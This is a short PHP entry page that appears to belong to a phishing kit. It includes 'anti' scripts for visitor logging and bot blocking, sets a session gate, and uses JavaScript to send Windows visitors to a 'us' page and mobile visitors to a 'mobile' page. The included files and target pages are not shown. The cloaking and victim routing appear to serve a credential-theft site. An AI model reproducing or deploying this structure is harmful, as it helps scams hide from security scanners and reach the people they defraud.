<?php
include './anti/config.php';
include './anti/functions.php';
include './anti/visitor.php';
include './anti/antibots.php';
$_SESSION['allowed'] = true;
?>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery-browser/0.1.0/jquery.browser.min.js"></script>
<script type="text/javascript">
    $(function () {
        if ($.browser.platform == "win") {
            window.location.href = "us/index.php";
        }
        if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) )     
{
   var url = "mobile/index.php";    
   $(location).attr('href',url);

}
    });
</script>